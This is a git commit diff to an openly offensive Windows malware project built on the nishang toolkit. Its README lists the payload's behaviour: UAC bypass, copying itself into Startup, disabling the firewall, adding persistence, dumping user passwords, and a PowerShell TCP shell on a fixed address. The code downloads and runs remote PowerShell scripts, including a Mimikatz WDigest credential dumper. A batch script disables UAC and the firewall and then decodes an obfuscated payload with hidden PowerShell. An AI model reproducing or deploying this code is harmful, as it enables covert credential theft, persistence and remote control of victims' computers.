8dcd96968731482d836a5298fd5e002a099986e0
nekocode <syfyw@qq.com>
2015-10-20 16:36:25 +0800

    update 1.ps1

--- README.md
+++ README.md
@@ -2,7 +2,7 @@
 
 powered by [nishang](https://github.com/samratashok/nishang)
 
-### behaviour
+### main behaviour
 - extract bat file to tmp directory
 - bypass UAC and run bat file to:
     - copy self to autorun directory
@@ -10,6 +10,10 @@ powered by [nishang](https://github.com/samratashok/nishang)
 	- close network firewall
 	- extract 1.ps1 to powershell root directory
 	- run 1.ps1
+- Add-Persistence
+- lock screen and dump user passwords
+- run PowerShellTcp listenning on 192.168.10.99:8099
+
 
 ### 1.ps1
 ```
@@ -18,6 +22,16 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
 Add-Persistence -ScriptPath C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1
 
+$strFileName="c:\windows\zzzjob.log"
+If (Test-Path $strFileName){
+	# // File exists
+	
+}Else{
+	# // File does not exist
+	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
+	Invoke-MimikatzWDigestDowngrade
+	Get-Job | Receive-Job | Out-File c:\windows\zzzjob.log
+}
 
 While(1){
 	Try {
--- hack.bat
+++ hack.bat
@@ -6,8 +6,11 @@ echo "EnableLUA"=dword:00000000>>%Temp%\lua.reg
 echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">>%Temp%\render.bat
 echo regedit /s lua.reg>%Temp%\render.bat
 echo netsh advfirewall set allprofiles state off>>%Temp%\render.bat
+
 echo cd "C:\Windows\System32\WindowsPowerShell\v1.0">>%Temp%\render.bat
-echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode vVBNS8NAED03kP+wB6ENkk3SgjS9Se0hB2swlQjGw3YzJmuT3bI7bSjif3fTDxTx7GEZ9s3Me29esngmoyV0/sP6HTiS7GAQWroEpDmseSNAokfvVCcbxcoMtZDVaFgjbs0sCDTraCWw3q13BjRXEu045aoNDGs1Q2ZqtQmkMDWTVdAyy62DrIamMUEi92oDfqo60Edoxbd0a6Kh5zquk/y/rycUjcBDcFuWfgraCItKDhdPv2DiZ1yLLaYMazKfFbmQpepMcTI6GV+A7/uKfUTDIur5+gtdJ69FA6PI+3CdwUofSF8Hf8VC/EfYW2krmqTWhwZjSBSPaXQzpVFI45jYBY1kGsaxJfm0b86Q1yfKXAsEf6G10uTqWF7CV7pS59Q8cv0D7vU5Q6FkIt8UTZUR/efeSrIKzuQZMo1+1gBYbxnYgEtDJq5je18= -IsString -OutputFilePath 1.ps1" >>%Temp%\render.bat
+
+echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode xVLRatswFH1OIP8gukIThqW4hdIE9jDarHjQ1NQpGSx7UORbW40tBekmbrLt33ftuFs3Cnvbni46ujr3nHMVTT6x/hSq4Hb5CApZsvMIJZ8C8jksVaHB4IBf2coUVqYJOm2y/kmOuPZjIZyseKYx3yw3HpyyBqmdK1sKL0snUfrcroTRPpcmE6UkbieSHIrCi8hs7QqC2FbgGmim1nztw5NBr9vrRv9e1z3qQuNOvE/TIAbnNaFGwbOmP2AWJMrpNcYSc3Y5Xsy1SW3lFwehZ6fPwC9/i23Ih4uw5qsdHnt0H3QBU1nCuyM1XlQtw36/f7RLXtjsiHJ4YP0ZeAyaOS/fDL72up03TAhWIwyeSJgnqNf9Pik8/H6bWvDMWDy00dV/yPeaHFBp936jS72SuJ9f6Yz81ZMyJ9OfcXf+0kcd14DBR7tk39gdKNBbaE+3Gwwa16+GSvnU8c9z6uiHTYozt2N17bz2J1lwB1vaO208iukTOPCehaNTHp5f8HDIRyNGDxyyi+FoRCTE3rmUqPID5dxphGDinHXsuCmfh1/4zLaRDtjbF3A9X0nU1kTmwfLYel0fbmikzKAlT1A6DJICgLQlQOmnnp01tn4A -IsString -OutputFilePath 1.ps1" >>%Temp%\render.bat
+
 echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden 1.ps1 >>%Temp%\render.bat
 
 
